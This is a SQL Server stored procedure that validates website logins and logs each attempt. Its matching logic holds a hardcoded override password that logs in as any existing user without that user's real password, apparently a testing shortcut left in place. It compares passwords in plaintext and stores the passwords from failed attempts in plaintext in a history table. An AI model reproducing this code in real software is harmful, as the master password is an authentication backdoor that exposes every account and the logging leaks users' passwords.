USE [WebDev]
GO
/****** Object:  StoredProcedure [dbo].[spweb_loginValidate]    Script Date: 12/22/2020 8:09:00 AM ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO



-- =============================================
-- Author:		B.Grant
-- Create date: 3/2012
-- Description:	test website login. formerly logintest
-- return loginid if user,pwd match; -1 if user only matches; -2 if neither; -4 if matched but inactive
-- added IP 5/2015
-- removed password logging for successful logins 11/2015
-- added output value for log table insert 11/2015 for .net session sync
-- =============================================
CREATE PROCEDURE [dbo].[spweb_loginValidate]
	@user varchar(50),
	@password varchar(50),
	@role varchar(20),
	@ip varchar(20),
	@logid int output
AS
BEGIN
	SET NOCOUNT ON;
	DECLARE @retval int
	DECLARE @matchBoth int
	DECLARE @matchUserOnly int
	DECLARE @active int
	DECLARE @defaultPMID int
	DECLARE @dbrole int
	DECLARE @override varchar(15)
	SET @override = 'bb4590452'
	
	
	--initialize defaultPMID
	set @defaultPMID = null
	
	--test user and password
	select top 1 @matchBoth = loginid, @active = active, @defaultPMID = defaultPMID,@dbrole=roleid from userlogin 
		where (login=@user)
		and (password=@password)
		
	--test user only
	select top 1 @matchUserOnly = loginid from userlogin 
		where (login=@user)
		--and active=1
		
	select @retval = 
	case 
		when @matchBoth is not null then --@matchBoth
			case when @active=1 then @matchBoth else -4 end
		--else case when @matchUserOnly is not null then -1 else -2 end
		--replace with above line when testing complete:
		else case when @matchUserOnly is not null then 
			case when @password=@override then @matchUserOnly else -1 end	
			else -2 end			
	end
	SELECT @retval as retval
	if @retval>0
		begin
			insert into login_history (dt,username,password,login_type,role,defaultPMID,ip) 
				values(getdate(),@user,null,'login',case when @role is null then convert(varchar(20),@dbrole) else @role end,@defaultPMID,@ip)
		end
	else
		begin
			insert into login_history (dt,username,password,login_type) 
				values(getdate(),@user,@password,'failed')
		end
	--SELECT @logid = SCOPE_IDENTITY()
	SELECT @logid = @defaultPMID
	RETURN @retval

END



--grant exec on spweb_loginValidate to webdevuser
GO
